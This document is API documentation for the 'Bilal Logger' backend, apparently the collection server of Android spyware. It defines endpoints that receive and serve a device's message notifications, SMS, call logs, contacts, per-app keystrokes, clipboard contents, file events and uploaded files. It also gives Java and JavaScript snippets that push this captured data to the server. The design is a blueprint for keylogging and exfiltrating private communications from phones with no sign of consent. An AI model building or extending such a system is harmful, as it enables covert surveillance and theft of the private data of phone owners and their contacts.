# Bilal Logger Backend API Documentation

## Overview

The Bilal Logger Backend provides a comprehensive REST API for device registration, data collection, and file storage. All endpoints support per-device organization and pagination.

**Base URL:** `http://localhost:3000/api`  
**Content-Type:** `application/json`  
**Authentication:** Device-based (via deviceId)

## Device Management

### Register Device

**POST** `/register`

Register a new device or update existing device information.

**Request Body:**
```json
{
  "deviceId": "unique_device_identifier",
  "deviceInfo": {
    "model": "Pixel 7",
    "manufacturer": "Google",
    "androidVersion": "13",
    "appVersion": "1.0.0"
  }
}
```

**Response:**
```json
{
  "success": true,
  "uuid": "550e8400-e29b-41d4-a716-446655440000",
  "deviceId": "unique_device_identifier"
}
```

**Error Response:**
```json
{
  "error": "Device ID is required"
}
```

### List Devices

**GET** `/devices`

Retrieve all registered devices.

**Response:**
```json
{
  "success": true,
  "devices": [
    {
      "deviceId": "device123",
      "uuid": "550e8400-e29b-41d4-a716-446655440000",
      "registrationDate": "2023-11-05T10:30:00.000Z",
      "lastSeen": "2023-11-05T15:45:00.000Z",
      "deviceInfo": {
        "model": "Pixel 7",
        "manufacturer": "Google",
        "androidVersion": "13",
        "appVersion": "1.0.0"
      }
    }
  ]
}
```

## Data Upload Endpoints

All data upload endpoints follow the same pattern and support batch uploads.

### Notifications

**POST** `/notifications`

Upload notification data.

**Request Body:**
```json
{
  "deviceId": "device123",
  "data": [
    {
      "packageName": "com.whatsapp",
      "title": "New Message",
      "text": "John Doe: Hey, how are you?",
      "appName": "WhatsApp",
      "timestamp": 1699123456789
    }
  ]
}
```

**Response:**
```json
{
  "success": true,
  "count": 1,
  "message": "1 notifications uploaded successfully"
}
```

### SMS Messages

**POST** `/sms`

Upload SMS data.

**Request Body:**
```json
{
  "deviceId": "device123",
  "data": [
    {
      "address": "+1234567890",
      "type": "INBOX",
      "body": "Hello from SMS",
      "timestamp": 1699123456789
    }
  ]
}
```

### Call Logs

**POST** `/callLogs`

Upload call log data.

**Request Body:**
```json
{
  "deviceId": "device123",
  "data": [
    {
      "number": "+1234567890",
      "type": "OUTGOING",
      "duration": 120,
      "timestamp": 1699123456789
    }
  ]
}
```

### Contacts

**POST** `/contacts`

Upload contact data.

**Request Body:**
```json
{
  "deviceId": "device123",
  "data": [
    {
      "name": "John Doe",
      "phoneNumber": "+1234567890",
      "email": "john@example.com"
    }
  ]
}
```

### Keylogs

**POST** `/keylogs`

Upload keyboard input logs.

**Request Body:**
```json
{
  "deviceId": "device123",
  "data": [
    {
      "key": "a",
      "appPackage": "com.whatsapp",
      "timestamp": 1699123456789
    }
  ]
}
```

### Clipboard Data

**POST** `/clipboard`

Upload clipboard content.

**Request Body:**
```json
{
  "deviceId": "device123",
  "data": [
    {
      "content": "Copied text content",
      "timestamp": 1699123456789
    }
  ]
}
```

### File Events

**POST** `/fileEvents`

Upload file system events.

**Request Body:**
```json
{
  "deviceId": "device123",
  "data": [
    {
      "filename": "document.pdf",
      "eventType": "CREATED",
      "directoryPath": "/storage/emulated/0/Documents",
      "timestamp": 1699123456789
    }
  ]
}
```

## Data Retrieval Endpoints

All data retrieval endpoints support pagination and filtering.

### Get Notifications

**GET** `/notifications/{deviceId}`

**Query Parameters:**
- `page` (default: 1) - Page number
- `limit` (default: 50) - Items per page
- `uploaded` (optional) - Filter by upload status

**Example:**
```
GET /notifications/device123?page=1&limit=20&uploaded=true
```

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "deviceId": "device123",
      "packageName": "com.whatsapp",
      "title": "New Message",
      "text": "John Doe: Hey, how are you?",
      "appName": "WhatsApp",
      "timestamp": "2023-11-05T10:30:56.789Z",
      "uploaded": true,
      "uploadDate": "2023-11-05T10:31:00.000Z"
    }
  ],
  "pagination": {
    "page": 1,
    "limit": 20,
    "total": 150,
    "pages": 8
  }
}
```

### Get SMS

**GET** `/sms/{deviceId}`

Same query parameters and response format as notifications.

### Get Call Logs

**GET** `/callLogs/{deviceId}`

Same query parameters and response format as notifications.

### Get Contacts

**GET** `/contacts/{deviceId}`

Same query parameters and response format as notifications.

### Get Keylogs

**GET** `/keylogs/{deviceId}`

Same query parameters and response format as notifications.

### Get Clipboard Data

**GET** `/clipboard/{deviceId}`

Same query parameters and response format as notifications.

### Get File Events

**GET** `/fileEvents/{deviceId}`

Same query parameters and response format as notifications.

## File Upload

### Upload Files

**POST** `/files/{deviceId}`

Upload files with automatic organization by type.

**Content-Type:** `multipart/form-data`

**Form Data:**
- `file` - The file to upload
- `fileType` - Type of file (image, document, video, audio, archive)
- `originalName` - Original filename

**Example:**
```bash
curl -X POST http://localhost:3000/api/files/device123 \
  -F "file=@document.pdf" \
  -F "fileType=document" \
  -F "originalName=important_document.pdf"
```

**Response:**
```json
{
  "success": true,
  "filename": "1699123456789_important_document.pdf",
  "path": "device123/documents/1699123456789_important_document.pdf",
  "size": 1024000
}
```

## System Endpoints

### Health Check

**GET** `/health`

Check server status and uptime.

**Response:**
```json
{
  "status": "healthy",
  "timestamp": "2023-11-05T15:45:00.000Z",
  "uptime": 12345.67
}
```

## Error Handling

All endpoints return consistent error responses:

**400 Bad Request:**
```json
{
  "error": "Device ID and data are required"
}
```

**404 Not Found:**
```json
{
  "error": "Device not found"
}
```

**500 Internal Server Error:**
```json
{
  "error": "Failed to upload notifications"
}
```

## Data Schemas

### Notification Schema
```json
{
  "deviceId": "string (required)",
  "packageName": "string",
  "title": "string",
  "text": "string",
  "appName": "string",
  "timestamp": "Date",
  "uploaded": "boolean",
  "uploadDate": "Date"
}
```

### SMS Schema
```json
{
  "deviceId": "string (required)",
  "address": "string",
  "type": "string (INBOX/OUTBOX/SENT)",
  "body": "string",
  "timestamp": "Date",
  "uploaded": "boolean",
  "uploadDate": "Date"
}
```

### Call Log Schema
```json
{
  "deviceId": "string (required)",
  "number": "string",
  "type": "string (INCOMING/OUTGOING/MISSED)",
  "duration": "number (seconds)",
  "timestamp": "Date",
  "uploaded": "boolean",
  "uploadDate": "Date"
}
```

### Contact Schema
```json
{
  "deviceId": "string (required)",
  "name": "string",
  "phoneNumber": "string",
  "email": "string",
  "uploaded": "boolean",
  "uploadDate": "Date"
}
```

### Keylog Schema
```json
{
  "deviceId": "string (required)",
  "key": "string",
  "appPackage": "string",
  "timestamp": "Date",
  "uploaded": "boolean",
  "uploadDate": "Date"
}
```

### Clipboard Schema
```json
{
  "deviceId": "string (required)",
  "content": "string",
  "timestamp": "Date",
  "uploaded": "boolean",
  "uploadDate": "Date"
}
```

### File Event Schema
```json
{
  "deviceId": "string (required)",
  "filename": "string",
  "eventType": "string (CREATED/MODIFIED/DELETED/UPLOADED)",
  "directoryPath": "string",
  "timestamp": "Date",
  "uploaded": "boolean",
  "uploadDate": "Date"
}
```

## File Storage Structure

Files are organized by device and type with timestamped filenames:

```
uploads/
├── device123/
│   ├── images/
│   │   ├── 1699123456789_photo1.jpg
│   │   └── 1699123456789_photo2.png
│   ├── documents/
│   │   ├── 1699123456789_document1.pdf
│   │   └── 1699123456789_document2.docx
│   ├── videos/
│   │   └── 1699123456789_video1.mp4
│   ├── audio/
│   │   └── 1699123456789_audio1.mp3
│   └── archives/
│       └── 1699123456789_archive1.zip
└── device456/
    └── ...
```

## MongoDB Collections

Each device gets its own set of collections:

- `{deviceId}_notifications`
- `{deviceId}_sms`
- `{deviceId}_callLogs`
- `{deviceId}_contacts`
- `{deviceId}_keylogs`
- `{deviceId}_clipboard`
- `{deviceId}_fileEvents`

## Rate Limiting

Currently no rate limiting is implemented. Consider implementing rate limiting for production use.

## Security Considerations

- All file uploads are validated
- Device authentication is required for all operations
- File size limits are enforced
- CORS is configured for cross-origin requests
- Input validation on all endpoints

## Usage Examples

### Android Integration

```java
// Register device
String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
JSONObject deviceInfo = new JSONObject();
deviceInfo.put("model", Build.MODEL);
deviceInfo.put("manufacturer", Build.MANUFACTURER);
deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
deviceInfo.put("appVersion", "1.0.0");

// Upload notifications
JSONArray notifications = new JSONArray();
// ... populate with notification data
JSONObject payload = new JSONObject();
payload.put("deviceId", deviceId);
payload.put("data", notifications);

// Send to server
// POST /api/notifications
```

### JavaScript/Node.js Integration

```javascript
// Register device
const deviceInfo = {
  deviceId: 'unique_device_id',
  deviceInfo: {
    model: 'Pixel 7',
    manufacturer: 'Google',
    androidVersion: '13',
    appVersion: '1.0.0'
  }
};

const response = await fetch('http://localhost:3000/api/register', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(deviceInfo)
});

// Upload data
const data = {
  deviceId: 'unique_device_id',
  data: [
    {
      packageName: 'com.whatsapp',
      title: 'New Message',
      text: 'Hello World',
      appName: 'WhatsApp',
      timestamp: Date.now()
    }
  ]
};

const uploadResponse = await fetch('http://localhost:3000/api/notifications', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data)
});
```

## Support

For issues and questions, please refer to the project documentation or create an issue in the repository. 